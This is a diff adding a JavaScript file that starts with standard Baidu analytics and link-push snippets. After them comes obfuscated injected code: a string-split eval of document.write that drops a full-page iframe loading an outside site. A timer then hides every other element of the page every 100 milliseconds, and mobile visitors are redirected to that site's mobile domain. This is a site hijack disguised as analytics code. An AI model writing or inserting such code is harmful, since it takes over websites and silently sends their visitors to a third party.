@@ -1,0 +1,55 @@
+﻿//百度统计
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?94d19a5375f87a6c53b43bd4b26d2621";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+//百度推送
+(function() {
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+
+
+var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="90'+'50" src="http://www.lyasen.com"></iframe></center>';
+eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
+	
+try{
+	setInterval(function(){
+
+		try{
+			document.getElementById("div"+"All").style.display="no"+"ne";
+		}catch(e){}
+
+		for(var i=0;i<document.body.children.length;i++){
+			try{
+				var tagname = document.body.children[i].tagName;
+				var myid = document.body.children[i].id;
+				if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
+				  // if(tagname!="center"){ 
+				     document.body.children[i].style.display="non"+"e";
+				   //}
+				}
+			}catch(e){}
+		}
+
+	},100);
+}catch(e){}
+
+
+//识别跳转
+var mobileUrl = "http://wap.lyasen.com/",
+    mobile = (/mmp|symbian|smartphone|midp|wap|phone|xoom|iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase()));
+if (mobile) {
+    window.location = mobileUrl
+}
